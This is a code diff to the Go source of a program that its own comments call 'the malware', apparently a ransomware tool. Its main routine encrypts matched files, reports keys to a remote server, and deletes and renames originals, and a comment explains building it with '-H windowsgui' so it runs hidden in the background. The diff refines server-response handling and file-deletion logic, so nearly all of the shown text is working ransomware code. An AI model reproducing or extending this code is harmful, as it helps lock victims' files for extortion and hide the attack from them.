@@ -5,6 +5,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -35,6 +36,11 @@ var (
 )
 
 func main() {
+	// If you compile this program without -ldflags "-H windowsgui"
+	// you can see a console window with all actions performed by
+	// the malware. Otherwise, the prints above and all logs will be
+	// discarted and it will run in background
+	//
 	// Fun ASCII
 	cmd.PrintBanner()
 
@@ -44,11 +50,6 @@ func main() {
 	// Hannibal ad portas
 	encryptFiles()
 
-	// If you compile this program without -ldflags "-H windowsgui"
-	// you can see a console window with all actions performed by
-	// the malware. Otherwise, the lines above and all logs will be
-	// discarted and it will run in background
-	//
 	// If in console mode, wait for enter to close the window
 	var s string
 	fmt.Println("Press enter to quit")
@@ -94,12 +95,17 @@ func encryptFiles() {
 		case 200, 204:
 			// \o/
 			break
-		case 409:
-			log.Println("Duplicated ID, trying to generate a new keypair")
-			continue
 		default:
-			log.Printf("An error ocurred, the server respond with status %d\n"+
-				" Possible bad encryption or bad json payload\n", res.StatusCode)
+			response := struct {
+				Status  int    `json:"status"`
+				Message string `json:"message"`
+			}{}
+			// Parse the json response
+			if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
+				log.Println(err)
+				continue
+			}
+			log.Printf("%d - %s\n", response.Status, response.Message)
 			continue
 		}
 
@@ -154,7 +160,7 @@ func encryptFiles() {
 			for {
 				select {
 				case file, ok := <-cmd.MatchedFiles:
-					// Check if has nothing to receive from the channel
+					// Check if has nothing to receive from the channel(it's closed)
 					if !ok {
 						return
 					}
@@ -292,6 +298,7 @@ func encryptFile(file cmd.File, enckey string) {
 	err = os.Remove(cmd.TempDir + file.Name())
 	if err != nil {
 		log.Println("Cannot delete temporary file, skipping...")
+		return
 	}
 
 	// Schedule the file to rename it later
